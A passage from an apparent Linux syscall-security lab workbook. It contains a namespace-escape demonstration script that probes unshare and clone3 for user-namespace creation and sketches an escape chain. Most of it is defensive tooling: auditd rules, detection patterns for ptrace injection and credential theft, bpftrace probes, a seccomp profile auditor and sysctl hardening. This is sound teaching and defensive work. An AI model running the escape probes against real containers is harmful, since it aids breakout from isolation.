        except (FileNotFoundError, PermissionError):
            pass
        return 0

def dump_filter(pid):
    """Use seccomp-tools to dump the BPF filter (requires root + seccomp-tools gem)."""
    try:
        result = subprocess.run(
            ["seccomp-tools", "dump", "-p", str(pid)],
            capture_output=True, text=True, timeout=5
        )
        return result.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None

def scan_all():
    procs = []
    for entry in os.listdir("/proc"):
        if entry.isdigit():
            p = ProcessSeccomp(int(entry))
            if p.name != "unknown":
                procs.append(p)

    # Categorize
    unprotected = [p for p in procs if p.seccomp_mode == 0]
    filtered = [p for p in procs if p.seccomp_mode == 2]
    strict = [p for p in procs if p.seccomp_mode == 1]
    container_unprotected = [p for p in unprotected if p.in_container]
    traced = [p for p in procs if p.get_tracer() > 0]
    rwx_procs = [p for p in procs if p.has_rwx_maps()]

    print(f"{'='*70}")
    print(f" Seccomp Filter Enumeration — {len(procs)} processes scanned")
    print(f"{'='*70}\n")

    print(f"Seccomp mode distribution:")
    print(f"  Disabled (0): {len(unprotected)}")
    print(f"  Strict   (1): {len(strict)}")
    print(f"  Filter   (2): {len(filtered)}")

    if container_unprotected:
        print(f"\n[!] ALERT: {len(container_unprotected)} container processes WITHOUT seccomp:")
        for p in container_unprotected[:10]:
            print(f"    PID {p.pid:>6} ({p.name}) — uid={p.uid}")

    if traced:
        print(f"\n[!] ALERT: {len(traced)} processes being traced (ptrace attached):")
        for p in traced:
            print(f"    PID {p.pid:>6} ({p.name}) — TracerPid={p.get_tracer()}")

    if rwx_procs:
        print(f"\n[!] WARNING: {len(rwx_procs)} processes with RWX mappings:")
        for p in rwx_procs[:10]:
            print(f"    PID {p.pid:>6} ({p.name})")

    if filtered:
        print(f"\n Seccomp-filtered processes (showing first 20):")
        print(f"  {'PID':>6} {'Name':<20} {'Filters':>7} {'Container':>10}")
        for p in sorted(filtered, key=lambda x: x.filter_count, reverse=True)[:20]:
            print(f"  {p.pid:>6} {p.name:<20} {p.filter_count:>7} "
                  f"{'yes' if p.in_container else 'no':>10}")

def scan_single(pid):
    p = ProcessSeccomp(pid)
    print(f"Process: {p.name} (PID {p.pid})")
    print(f"  Seccomp mode: {SECCOMP_MODES.get(p.seccomp_mode, 'unknown')} ({p.seccomp_mode})")
    print(f"  Filter count: {p.filter_count}")
    print(f"  UID: {p.uid}")
    print(f"  Container: {p.in_container}")
    print(f"  TracerPid: {p.get_tracer()}")
    print(f"  RWX maps: {p.has_rwx_maps()}")

    if p.seccomp_mode == 2:
        print(f"\n  Attempting BPF filter dump...")
        bpf = dump_filter(pid)
        if bpf:
            print(bpf)
        else:
            print("  (seccomp-tools not available or insufficient permissions)")

if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--pid":
        scan_single(int(sys.argv[2]))
    else:
        scan_all()
```

---

### Exercise 8: Namespace Escape Techniques

**Objective:** Understand container escape via unfiltered namespace-manipulation syscalls (`unshare`, `clone3`, `setns`).

```bash
#!/bin/bash
# offensive/namespace_escape_demo.sh
# Demonstrates namespace manipulation for container escape.
# Run inside a container or namespace-restricted context.

echo "=== Namespace Escape Demonstration ==="
echo ""

echo "[1] Current namespace context:"
ls -la /proc/self/ns/
echo ""

echo "[2] Current capabilities:"
cat /proc/self/status | grep -E '^(Cap|Seccomp|Name)'
echo ""

echo "[3] Attempting user namespace creation (unshare)..."
if unshare --user --map-root-user id 2>/dev/null; then
    echo "[!] VULN: User namespace creation succeeded!"
    echo "    In this namespace, we have full capabilities."
    echo "    Attack chain: unshare --user --mount -> mount procfs -> read host info"
else
    echo "[OK] User namespace creation blocked (seccomp or disabled)"
fi
echo ""

echo "[4] Checking clone3 availability..."
# Python one-liner to attempt clone3 with CLONE_NEWUSER
python3 -c "
import ctypes, os, struct, sys
libc = ctypes.CDLL('libc.so.6', use_errno=True)
# clone_args structure for clone3
CLONE_NEWUSER = 0x10000000
args = struct.pack('QQQQQQQQq', CLONE_NEWUSER, 0, 0, 0, 0, 0, 0, 0, 0)
# Try clone3 (NR 435 on x86_64)
ret = libc.syscall(435, args, len(args))
errno_val = ctypes.get_errno()
if ret >= 0:
    if ret == 0:
        # child
        os._exit(0)
    else:
        os.waitpid(ret, 0)
        print('[!] clone3 with CLONE_NEWUSER succeeded (PID={})'.format(ret))
else:
    print('[OK] clone3 with CLONE_NEWUSER blocked (errno={})'.format(errno_val))
" 2>/dev/null || echo "[OK] clone3 test could not run"

echo ""
echo "[5] Checking mount namespace manipulation..."
if unshare --mount ls / >/dev/null 2>&1; then
    echo "[!] mount namespace unshare succeeded"
else
    echo "[OK] mount namespace unshare blocked"
fi

echo ""
echo "[*] Detection: Monitor for unshare/clone3 with CLONE_NEWUSER flag"
echo "    auditd: -a always,exit -F arch=b64 -S unshare -k namespace_unshare"
echo "    auditd: -a always,exit -F arch=b64 -S clone3 -k clone3_ops"
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 1: Comprehensive Syscall Auditing

**Objective:** Deploy production-grade auditd rules covering all syscall-level attack surfaces from this chapter.

#### Step 1.1: Audit Rule Deployment

```bash
#!/bin/bash
# defensive/deploy_syscall_audit.sh
# Deploys comprehensive syscall auditing rules.
# Run as root on VM-FORENSICS.

set -euo pipefail

RULES_FILE="/etc/audit/rules.d/50-syscall-security.rules"

cat > "$RULES_FILE" << 'AUDIT_RULES'
## Syscall Security Auditing — Domain 2B
## Generated for detection engineering lab

# === io_uring (seccomp bypass, kernel exploit surface) ===
-a always,exit -F arch=b64 -S io_uring_setup -k io_uring_create
-a always,exit -F arch=b64 -S io_uring_enter -k io_uring_ops
-a always,exit -F arch=b64 -S io_uring_register -k io_uring_reg

# === ptrace (process injection, debugging, credential theft) ===
-a always,exit -F arch=b64 -S ptrace -F a0=16 -k ptrace_attach
-a always,exit -F arch=b64 -S ptrace -F a0=16902 -k ptrace_seize
-a always,exit -F arch=b64 -S ptrace -F a0=13 -k ptrace_setregs
-a always,exit -F arch=b64 -S ptrace -F a0=12 -k ptrace_getregs
-a always,exit -F arch=b64 -S ptrace -F a0=5 -k ptrace_pokedata
-a always,exit -F arch=b64 -S ptrace -F a0=4 -k ptrace_poketext
-a always,exit -F arch=b64 -S ptrace -F a0=24 -k ptrace_syscall

# === Cross-process memory access ===
-a always,exit -F arch=b64 -S process_vm_readv -k xprocess_read
-a always,exit -F arch=b64 -S process_vm_writev -k xprocess_write

# === userfaultfd (kernel exploit primitive) ===
-a always,exit -F arch=b64 -S userfaultfd -k userfaultfd_create

# === Seccomp filter operations ===
-a always,exit -F arch=b64 -S seccomp -k seccomp_op
-a always,exit -F arch=b64 -S prctl -F a0=22 -k seccomp_prctl

# === Namespace manipulation (container escape) ===
-a always,exit -F arch=b64 -S unshare -k namespace_unshare
-a always,exit -F arch=b64 -S setns -k namespace_setns
-a always,exit -F arch=b64 -S clone3 -k clone3_ops

# === Kernel module operations ===
-a always,exit -F arch=b64 -S init_module -k kmod_load
-a always,exit -F arch=b64 -S finit_module -k kmod_load
-a always,exit -F arch=b64 -S delete_module -k kmod_unload

# === eBPF operations ===
-a always,exit -F arch=b64 -S bpf -k bpf_ops

# === RWX mmap (shellcode preparation) ===
-a always,exit -F arch=b64 -S mmap -F a2&0x7=0x7 -k mmap_rwx
-a always,exit -F arch=b64 -S mprotect -F a2&0x4=0x4 -k mprotect_exec

# === Dangerous syscalls ===
-a always,exit -F arch=b64 -S kexec_load -k kexec
-a always,exit -F arch=b64 -S kexec_file_load -k kexec
-a always,exit -F arch=b64 -S perf_event_open -k perf_event
AUDIT_RULES

echo "[+] Audit rules written to $RULES_FILE"

# Reload audit rules
augenrules --load
echo "[+] Audit rules loaded"

# Verify
auditctl -l | head -30
echo ""
echo "[+] $(auditctl -l | wc -l) rules active"
```

#### Step 1.2: Audit Log Analyzer

```python
#!/usr/bin/env python3
"""defensive/audit_analyzer.py
Real-time analysis of syscall audit events for attack detection.
Usage: sudo python3 audit_analyzer.py [--live | --file <audit.log>]
"""
import sys
import re
import time
import subprocess
from collections import defaultdict, deque
from datetime import datetime

ATTACK_PATTERNS = {
    "ptrace_injection": {
        "description": "ptrace-based code injection sequence",
        "indicators": ["ptrace_attach", "ptrace_setregs", "ptrace_pokedata"],
        "min_match": 2,
        "severity": "CRITICAL",
        "mitre": "T1055.008"
    },
    "syscall_redirect": {
        "description": "ptrace syscall redirection",
        "indicators": ["ptrace_attach", "ptrace_syscall", "ptrace_setregs"],
        "min_match": 3,
        "severity": "CRITICAL",
        "mitre": "T1055.008"
    },
    "iouring_bypass": {
        "description": "io_uring seccomp bypass attempt",
        "indicators": ["io_uring_create"],
        "min_match": 1,
        "severity": "HIGH",
        "mitre": "T1068"
    },
    "userfaultfd_exploit": {
        "description": "userfaultfd TOCTOU exploitation primitive",
        "indicators": ["userfaultfd_create"],
        "min_match": 1,
        "severity": "HIGH",
        "mitre": "T1068"
    },
    "namespace_escape": {
        "description": "Namespace manipulation (container escape)",
        "indicators": ["namespace_unshare", "clone3_ops"],
        "min_match": 1,
        "severity": "CRITICAL",
        "mitre": "T1611"
    },
    "shellcode_prep": {
        "description": "RWX memory mapping (shellcode preparation)",
        "indicators": ["mmap_rwx"],
        "min_match": 1,
        "severity": "HIGH",
        "mitre": "T1055"
    },
    "xprocess_access": {
        "description": "Cross-process memory access",
        "indicators": ["xprocess_read", "xprocess_write"],
        "min_match": 1,
        "severity": "HIGH",
        "mitre": "T1055"
    },
    "kernel_module": {
        "description": "Kernel module operation",
        "indicators": ["kmod_load", "kmod_unload"],
        "min_match": 1,
        "severity": "CRITICAL",
        "mitre": "T1547.006"
    }
}

class AuditEvent:
    def __init__(self, line):
        self.raw = line.strip()
        self.timestamp = self._extract(r'msg=audit\((\d+\.\d+):', line)
        self.syscall = self._extract(r'syscall=(\w+)', line)
        self.pid = self._extract(r'\bpid=(\d+)', line)
        self.ppid = self._extract(r'ppid=(\d+)', line)
        self.uid = self._extract(r'\buid=(\d+)', line)
        self.exe = self._extract(r'exe="([^"]+)"', line)
        self.comm = self._extract(r'comm="([^"]+)"', line)
        self.key = self._extract(r'key="([^"]+)"', line)
        self.a0 = self._extract(r'\ba0=(\w+)', line)
        self.a1 = self._extract(r'\ba1=(\w+)', line)
        self.exit_val = self._extract(r'exit=(-?\d+)', line)

    @staticmethod
    def _extract(pattern, text):
        m = re.search(pattern, text)
        return m.group(1) if m else None

class AttackDetector:
    def __init__(self):
        self.pid_events = defaultdict(lambda: deque(maxlen=100))
        self.alert_count = 0

    def process_event(self, event):
        if not event.key or not event.pid:
            return

        self.pid_events[event.pid].append(event)

        # Check each attack pattern
        for name, pattern in ATTACK_PATTERNS.items():
            recent_keys = {e.key for e in self.pid_events[event.pid]}
            matches = recent_keys & set(pattern["indicators"])

            if len(matches) >= pattern["min_match"]:
                self.alert_count += 1
                self._emit_alert(name, pattern, event, matches)

    def _emit_alert(self, name, pattern, event, matches):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n{'='*60}")
        print(f"[{ts}] ALERT #{self.alert_count}: {pattern['severity']}")
        print(f"  Pattern: {name}")
        print(f"  Description: {pattern['description']}")
        print(f"  MITRE ATT&CK: {pattern['mitre']}")
        print(f"  PID: {event.pid} ({event.comm})")
        print(f"  UID: {event.uid}")
        print(f"  Executable: {event.exe}")
        print(f"  Matched indicators: {', '.join(matches)}")
        print(f"  Latest syscall: {event.syscall} (key={event.key})")
        print(f"{'='*60}")

def monitor_live():
    """Monitor audit log in real-time using ausearch."""
    detector = AttackDetector()
    print("[*] Starting live audit monitoring...")
    print("[*] Monitoring for: " + ", ".join(ATTACK_PATTERNS.keys()))
    print("[*] Press Ctrl+C to stop\n")

    proc = subprocess.Popen(
        ["tail", "-F", "/var/log/audit/audit.log"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        text=True
    )

    try:
        for line in proc.stdout:
            if "SYSCALL" in line and "key=" in line:
                event = AuditEvent(line)
                detector.process_event(event)
    except KeyboardInterrupt:
        proc.terminate()
        print(f"\n[*] Monitoring stopped. Total alerts: {detector.alert_count}")

def analyze_file(filepath):
    """Analyze an audit log file for attack patterns."""
    detector = AttackDetector()
    print(f"[*] Analyzing {filepath}...")

    with open(filepath) as f:
        for line in f:
            if "SYSCALL" in line and "key=" in line:
                event = AuditEvent(line)
                detector.process_event(event)

    print(f"\n[*] Analysis complete. Total alerts: {detector.alert_count}")

    # Summary by PID
    print(f"\n{'='*60}")
    print("PID Activity Summary:")
    for pid, events in sorted(detector.pid_events.items()):
        keys = {e.key for e in events if e.key}
        if keys:
            comm = next((e.comm for e in events if e.comm), "?")
            print(f"  PID {pid} ({comm}): {', '.join(sorted(keys))}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--live":
        monitor_live()
    elif len(sys.argv) > 2 and sys.argv[1] == "--file":
        analyze_file(sys.argv[2])
    else:
        print("Usage:")
        print(f"  sudo {sys.argv[0]} --live          # Real-time monitoring")
        print(f"  sudo {sys.argv[0]} --file audit.log # Analyze log file")
```

---

### Exercise 2: bpftrace Syscall Probes

**Objective:** Deploy targeted bpftrace probes for real-time syscall-level attack detection.

```bash
#!/bin/bash
# defensive/deploy_bpf_probes.sh
# Launches bpftrace probes for syscall monitoring in a tmux session.
# Run as root on VM-FORENSICS.

set -euo pipefail

SESSION="syscall_monitor"

tmux kill-session -t "$SESSION" 2>/dev/null || true
tmux new-session -d -s "$SESSION"

# Probe 1: ptrace operations
tmux send-keys -t "$SESSION" "bpftrace -e '
tracepoint:syscalls:sys_enter_ptrace {
    \$req = args.request;
    \$names = \"TRACEME=0 PEEKTEXT=1 PEEKDATA=2 POKETEXT=4 POKEDATA=5 CONT=7 KILL=8 SINGLESTEP=9 GETREGS=12 SETREGS=13 ATTACH=16 DETACH=17 SYSCALL=24 SEIZE=16902\";
    printf(\"[ptrace] pid=%d comm=%s request=%ld target_pid=%ld\\n\",
           pid, comm, \$req, args.pid);
}
'" C-m

# Probe 2: io_uring creation
tmux split-window -t "$SESSION"
tmux send-keys -t "$SESSION" "bpftrace -e '
tracepoint:syscalls:sys_enter_io_uring_setup {
    printf(\"[io_uring] pid=%d uid=%d comm=%s entries=%d\\n\",
           pid, uid, comm, args.entries);
}
tracepoint:syscalls:sys_enter_io_uring_enter {
    printf(\"[io_uring_enter] pid=%d comm=%s to_submit=%d\\n\",
           pid, comm, args.to_submit);
}
'" C-m

# Probe 3: userfaultfd + cross-process memory
tmux split-window -t "$SESSION"
tmux send-keys -t "$SESSION" "bpftrace -e '
tracepoint:syscalls:sys_enter_userfaultfd {
    printf(\"[!userfaultfd] pid=%d uid=%d comm=%s flags=0x%x\\n\",
           pid, uid, comm, args.flags);
}
tracepoint:raw_syscalls:sys_enter /args.id == 310 || args.id == 311/ {
    printf(\"[xprocess] pid=%d uid=%d comm=%s NR=%ld (vm_%s)\\n\",
           pid, uid, comm, args.id,
           args.id == 310 ? \"readv\" : \"writev\");
}
'" C-m

# Probe 4: RWX mmap and mprotect+exec
tmux split-window -t "$SESSION"
tmux send-keys -t "$SESSION" "bpftrace -e '
tracepoint:syscalls:sys_enter_mmap {
    if ((args.prot & 7) == 7) {
        printf(\"[!RWX mmap] pid=%d comm=%s addr=0x%lx len=%ld prot=RWX\\n\",
               pid, comm, args.addr, args.len);
    }
}
tracepoint:syscalls:sys_enter_mprotect {
    if (args.prot & 4) {
        printf(\"[mprotect+X] pid=%d comm=%s addr=0x%lx len=%ld prot=0x%x\\n\",
               pid, comm, args.start, args.len, args.prot);
    }
}
'" C-m

tmux select-layout -t "$SESSION" tiled
echo "[+] Syscall monitoring probes deployed in tmux session: $SESSION"
echo "    Attach: tmux attach -t $SESSION"
```

---

### Exercise 3: Seccomp Hardening Profile Generator

**Objective:** Generate tailored seccomp profiles by tracing application syscall usage, then verify coverage against known attack surfaces.

```python
#!/usr/bin/env python3
"""defensive/seccomp_profiler.py
Generates a seccomp profile by tracing an application's syscall usage,
then audits the profile against known attack surfaces.

Usage:
  python3 seccomp_profiler.py trace -- ./myapp --args
  python3 seccomp_profiler.py audit profile.json
  python3 seccomp_profiler.py generate --from-trace trace.json --output profile.json
"""
import sys
import os
import json
import subprocess
import re
import tempfile
from pathlib import Path

ATTACK_SURFACE_SYSCALLS = {
    "io_uring_setup": ("io_uring seccomp bypass", "CRITICAL"),
    "io_uring_enter": ("io_uring operation submission", "CRITICAL"),
    "io_uring_register": ("io_uring resource registration", "HIGH"),
    "ptrace": ("Process injection/debugging", "HIGH"),
    "process_vm_readv": ("Cross-process memory read", "HIGH"),
    "process_vm_writev": ("Cross-process memory write", "CRITICAL"),
    "userfaultfd": ("Kernel TOCTOU exploit primitive", "CRITICAL"),
    "mount": ("Filesystem mount (container escape)", "CRITICAL"),
    "umount2": ("Filesystem unmount", "HIGH"),
    "pivot_root": ("Root filesystem change", "CRITICAL"),
    "unshare": ("Namespace creation", "HIGH"),
    "setns": ("Namespace entry", "HIGH"),
    "init_module": ("Kernel module load (code)", "CRITICAL"),
    "finit_module": ("Kernel module load (fd)", "CRITICAL"),
    "delete_module": ("Kernel module unload", "HIGH"),
    "kexec_load": ("Kernel replacement", "CRITICAL"),
    "kexec_file_load": ("Kernel replacement (fd)", "CRITICAL"),
    "bpf": ("eBPF operations", "HIGH"),
    "perf_event_open": ("Performance monitoring / side-channel", "MEDIUM"),
}

def trace_syscalls(command):
    """Trace syscalls using strace and return the set of unique syscall names."""
    print(f"[*] Tracing: {' '.join(command)}")

    with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
        trace_file = f.name

    try:
        proc = subprocess.run(
            ["strace", "-f", "-o", trace_file, "-e", "trace=all"] + command,
            timeout=60, capture_output=True
        )
    except subprocess.TimeoutExpired:
        print("[*] Trace timeout (60s) — using collected data")

    syscalls = set()
    pattern = re.compile(r'^\[?(?:pid\s+\d+\]?\s+)?(\w+)\(')

    with open(trace_file) as f:
        for line in f:
            m = pattern.match(line)
            if m:
                syscalls.add(m.group(1))

    os.unlink(trace_file)
    print(f"[+] Traced {len(syscalls)} unique syscalls")
    return syscalls

def generate_profile(syscalls, output_path):
    """Generate a seccomp JSON profile from traced syscalls."""
    # Always include essential runtime syscalls
    essential = {
        "rt_sigreturn", "exit_group", "exit", "brk",
        "mmap", "munmap", "mprotect", "arch_prctl",
        "set_tid_address", "set_robust_list", "rseq",
        "futex", "rt_sigaction", "rt_sigprocmask",
        "prlimit64", "getrandom", "close_range"
    }

    allowed = sorted(syscalls | essential)

    # Remove attack-surface syscalls that appeared in trace
    # (flag for review rather than auto-remove)
    flagged = []
    for sc in allowed:
        if sc in ATTACK_SURFACE_SYSCALLS:
            sev = ATTACK_SURFACE_SYSCALLS[sc][1]
            flagged.append((sc, sev))

    profile = {
        "defaultAction": "SCMP_ACT_ERRNO",
        "defaultErrnoRet": 1,
        "architectures": [
            "SCMP_ARCH_X86_64",
            "SCMP_ARCH_X86",
            "SCMP_ARCH_AARCH64"
        ],
        "syscalls": [
            {
                "names": allowed,
                "action": "SCMP_ACT_ALLOW"
            }
        ]
    }

    with open(output_path, 'w') as f:
        json.dump(profile, f, indent=2)

    print(f"[+] Profile written to {output_path}")
    print(f"    Allowed syscalls: {len(allowed)}")

    if flagged:
        print(f"\n[!] REVIEW REQUIRED — {len(flagged)} attack-surface syscalls in trace:")
        for sc, sev in flagged:
            desc = ATTACK_SURFACE_SYSCALLS[sc][0]
            print(f"    [{sev}] {sc}: {desc}")
        print("    Remove these unless the application genuinely requires them.")

    return profile

def audit_profile(profile_path):
    """Audit an existing seccomp profile against known attack surfaces."""
    with open(profile_path) as f:
        profile = json.load(f)

    print(f"=== Seccomp Profile Audit: {profile_path} ===\n")

    default_action = profile.get("defaultAction", "unknown")
    print(f"Default action: {default_action}")

    # Extract all allowed syscalls
    allowed = set()
    for entry in profile.get("syscalls", []):
        if entry.get("action") == "SCMP_ACT_ALLOW":
            allowed.update(entry.get("names", []))

    print(f"Total allowed syscalls: {len(allowed)}\n")

    # Check architecture coverage
    archs = profile.get("architectures", [])
    print(f"Architectures: {', '.join(archs) if archs else 'NONE (vulnerable!)'}")
    if not archs:
        print("[!] CRITICAL: No architecture restriction — compat bypass possible!")

    # Check default action
    if default_action == "SCMP_ACT_ALLOW":
        print("[!] CRITICAL: Default action is ALLOW — this is a denylist, not an allowlist!")

    # Check attack surface
    print(f"\n{'Syscall':<25} {'Severity':<10} {'Status':<10} {'Risk'}")
    print("-" * 80)

    issues = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
    for sc, (desc, sev) in sorted(ATTACK_SURFACE_SYSCALLS.items()):
        if sc in allowed:
            status = "ALLOWED"
            issues[sev] += 1
        else:
            status = "blocked"
        marker = "⚠" if status == "ALLOWED" else "✓"
        print(f"  {sc:<23} {sev:<10} {status:<10} {desc}")

    # Summary
    print(f"\n{'='*50}")
    print(f"CRITICAL issues: {issues['CRITICAL']}")
    print(f"HIGH issues:     {issues['HIGH']}")
    print(f"MEDIUM issues:   {issues['MEDIUM']}")

    total_issues = sum(issues.values())
    if total_issues == 0:
        print("\n[+] Profile passes all attack-surface checks")
    else:
        print(f"\n[!] {total_issues} attack-surface syscalls are allowed")
        print("    Review each and remove unless genuinely required")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} trace -- ./myapp args     # Trace and generate")
        print(f"  {sys.argv[0]} audit profile.json         # Audit existing profile")
        sys.exit(1)

    if sys.argv[1] == "trace":
        idx = sys.argv.index("--") if "--" in sys.argv else 2
        command = sys.argv[idx + 1:]
        syscalls = trace_syscalls(command)
        generate_profile(syscalls, "generated_seccomp.json")

    elif sys.argv[1] == "audit":
        audit_profile(sys.argv[2])
```

---

### Exercise 4: Syscall Hardening Deployment

**Objective:** Apply comprehensive sysctl hardening for syscall attack surface reduction.

```bash
#!/bin/bash
# defensive/deploy_sysctl_hardening.sh
# Applies syscall-level sysctl hardening.
# Run as root on both VMs (VM-FORENSICS for production, VM-ATTACK for testing).

set -euo pipefail

SYSCTL_FILE="/etc/sysctl.d/99-syscall-hardening.conf"

echo "=== Syscall Attack Surface Hardening ==="
echo ""
echo "[*] Current settings:"
echo "    userfaultfd:  $(cat /proc/sys/vm/unprivileged_userfaultfd 2>/dev/null || echo 'N/A')"
echo "    io_uring:     $(cat /proc/sys/io_uring_disabled 2>/dev/null || echo 'N/A')"
echo "    ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 'N/A')"
echo "    bpf:          $(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo 'N/A')"
echo "    perf:         $(cat /proc/sys/kernel/perf_event_paranoid)"
echo "    kptr:         $(cat /proc/sys/kernel/kptr_restrict)"
echo "    dmesg:        $(cat /proc/sys/kernel/dmesg_restrict)"
echo ""

cat > "$SYSCTL_FILE" << 'SYSCTL'
# === Syscall Attack Surface Reduction ===
# Domain 2B hardening configuration

# userfaultfd: restrict to CAP_SYS_PTRACE
# Eliminates unprivileged TOCTOU exploitation primitive
# Impact: breaks CRIU restore for unprivileged users (rare)
vm.unprivileged_userfaultfd = 0

# io_uring: disable for unprivileged users
# Eliminates seccomp bypass and reduces kernel attack surface
# Impact: breaks io_uring for non-root (most apps use epoll instead)
# Values: 0=enabled, 1=disabled-for-unprivileged, 2=disabled-entirely
# Use 2 for maximum hardening, 1 for compatibility
# io_uring_disabled = 1

# ptrace: restrict to descendants only (Yama scope 1)
# Use scope 2 (admin-only) for hardened environments
# Impact: scope 2 breaks gdb/strace for non-root users
kernel.yama.ptrace_scope = 1

# eBPF: restrict to privileged users
# Prevents eBPF-based kernel info leaks and exploitation
kernel.unprivileged_bpf_disabled = 1

# perf_event: maximum restriction
# Prevents side-channel attacks via performance counters
kernel.perf_event_paranoid = 3

# Kernel pointer restriction
# Prevents KASLR leaks via /proc/kallsyms
kernel.kptr_restrict = 2

# dmesg restriction
# Prevents kernel info leaks via dmesg
kernel.dmesg_restrict = 1

# Core dumps
# Prevents credential leak via core files of setuid programs
fs.suid_dumpable = 0

# Kexec: disable kernel replacement at runtime
kernel.kexec_load_disabled = 1
SYSCTL

echo "[+] Sysctl configuration written to $SYSCTL_FILE"

# Apply
sysctl --system 2>/dev/null | grep -c "^$" | true

# Handle io_uring_disabled separately (may not exist on older kernels)
if [ -f /proc/sys/io_uring_disabled ]; then
    echo 1 > /proc/sys/io_uring_disabled
    echo "[+] io_uring_disabled = 1 (applied)"
    echo "io_uring_disabled = 1" >> "$SYSCTL_FILE"
else
    echo "[*] io_uring_disabled sysctl not available (kernel < 6.0)"
fi

echo ""
echo "[+] Hardened settings applied:"
echo "    userfaultfd:  $(cat /proc/sys/vm/unprivileged_userfaultfd 2>/dev/null || echo 'N/A')"
echo "    io_uring:     $(cat /proc/sys/io_uring_disabled 2>/dev/null || echo 'N/A')"
echo "    ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo 'N/A')"
echo "    bpf:          $(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo 'N/A')"
echo "    perf:         $(cat /proc/sys/kernel/perf_event_paranoid)"
echo "    kptr:         $(cat /proc/sys/kernel/kptr_restrict)"
echo "    dmesg:        $(cat /proc/sys/kernel/dmesg_restrict)"
echo "    suid_dump:    $(cat /proc/sys/fs/suid_dumpable)"
echo "    kexec:        $(cat /proc/sys/kernel/kexec_load_disabled)"
```

---

### Exercise 5: Syscall Forensics Toolkit

**Objective:** Build forensic tools for reconstructing ptrace sessions, analyzing io_uring rings, and extracting seccomp filters from process memory.

#### Step 5.1: ptrace Session Reconstructor

```python
#!/usr/bin/env python3
"""defensive/ptrace_forensics.py
Reconstruct ptrace attack sessions from audit logs.
Detects injection, syscall redirection, and credential theft patterns.

Usage: sudo python3 ptrace_forensics.py /var/log/audit/audit.log [tracer_pid]
"""
import sys
import re
from collections import defaultdict
from datetime import datetime

PTRACE_OPS = {
    0: ("TRACEME", "self-trace / anti-debug"),
    1: ("PEEKTEXT", "read target code"),
    2: ("PEEKDATA", "read target data"),
    3: ("PEEKUSER", "read target registers (legacy)"),
    4: ("POKETEXT", "write target code"),
    5: ("POKEDATA", "write target data"),
    6: ("POKEUSER", "write target registers (legacy)"),
    7: ("CONT", "resume target"),
    8: ("KILL", "kill target"),
    9: ("SINGLESTEP", "execute one instruction"),
    12: ("GETREGS", "read all registers"),
    13: ("SETREGS", "write all registers"),
    16: ("ATTACH", "attach to target"),
    17: ("DETACH", "detach from target"),
    24: ("SYSCALL", "stop at next syscall"),
    16896: ("SETOPTIONS", "set trace options"),
    16897: ("GETEVENTMSG", "get event message"),
    16898: ("GETSIGINFO", "get signal info"),
    16899: ("SETSIGINFO", "set signal info"),
    16900: ("GETREGSET", "read register set"),
    16901: ("SETREGSET", "write register set"),
    16902: ("SEIZE", "stealth attach"),
}

ATTACK_SIGNATURES = [
    {
        "name": "Code Injection",
        "ops": {"ATTACH", "GETREGS", "POKEDATA", "SETREGS", "CONT", "DETACH"},
        "min_match": 4,
        "severity": "CRITICAL",
        "mitre": "T1055.008",
    },
    {
        "name": "Syscall Redirection",
        "ops": {"ATTACH", "SYSCALL", "GETREGS", "SETREGS"},
        "min_match": 4,
        "severity": "CRITICAL",
        "mitre": "T1055.008",
    },
    {
        "name": "Memory Read (Credential Theft)",
        "ops": {"ATTACH", "PEEKDATA", "DETACH"},
        "min_match": 3,
        "severity": "HIGH",
        "mitre": "T1003",
    },
    {
        "name": "Stealth Attach (SEIZE)",
        "ops": {"SEIZE"},
        "min_match": 1,
        "severity": "HIGH",
        "mitre": "T1055.008",
    },
    {
        "name": "Anti-Debug (Self-Trace)",
        "ops": {"TRACEME"},
        "min_match": 1,
        "severity": "MEDIUM",
        "mitre": "T1622",
    },
]

class PtraceSession:
    def __init__(self, tracer_pid):
        self.tracer_pid = tracer_pid
        self.tracer_comm = None
        self.tracer_exe = None
        self.events = []
        self.targets = set()

    def add_event(self, timestamp, op_code, target_pid, comm, exe):
        op_name, op_desc = PTRACE_OPS.get(op_code, (f"UNKNOWN({op_code})", "unknown"))
        self.events.append({
            "timestamp": timestamp,
            "op": op_name,
            "op_code": op_code,
            "op_desc": op_desc,
            "target": target_pid,
        })
        self.targets.add(target_pid)
        if comm: self.tracer_comm = comm
        if exe: self.tracer_exe = exe

    def detect_attacks(self):
        op_set = {e["op"] for e in self.events}
        detected = []
        for sig in ATTACK_SIGNATURES:
            matches = op_set & sig["ops"]
            if len(matches) >= sig["min_match"]:
                detected.append(sig)
        return detected

    def report(self):
        print(f"\n{'='*60}")
        print(f"ptrace Session: Tracer PID {self.tracer_pid}")
        print(f"  Executable: {self.tracer_exe or 'unknown'}")
        print(f"  Command: {self.tracer_comm or 'unknown'}")
        print(f"  Target PIDs: {', '.join(str(t) for t in sorted(self.targets))}")
        print(f"  Total operations: {len(self.events)}")
        print(f"{'='*60}")

        # Timeline
        print(f"\n  {'Timestamp':<18} {'Operation':<18} {'Target':>8} {'Description'}")
        print(f"  {'-'*18} {'-'*18} {'-'*8} {'-'*30}")
        for e in self.events:
            print(f"  {e['timestamp']:<18} {e['op']:<18} {e['target']:>8} {e['op_desc']}")

        # Attack detection
        attacks = self.detect_attacks()
        if attacks:
            print(f"\n  [!!!] ATTACK PATTERNS DETECTED:")
            for atk in attacks:
                print(f"    [{atk['severity']}] {atk['name']} (MITRE: {atk['mitre']})")
        else:
            print(f"\n  [OK] No known attack patterns detected")

def parse_audit_log(logfile, filter_pid=None):
    sessions = defaultdict(lambda: None)
    pattern = re.compile(
        r'msg=audit\((\d+)\.\d+:\d+\).*?'
        r'syscall=101.*?'   # ptrace = 101 on x86_64
        r'pid=(\d+).*?'
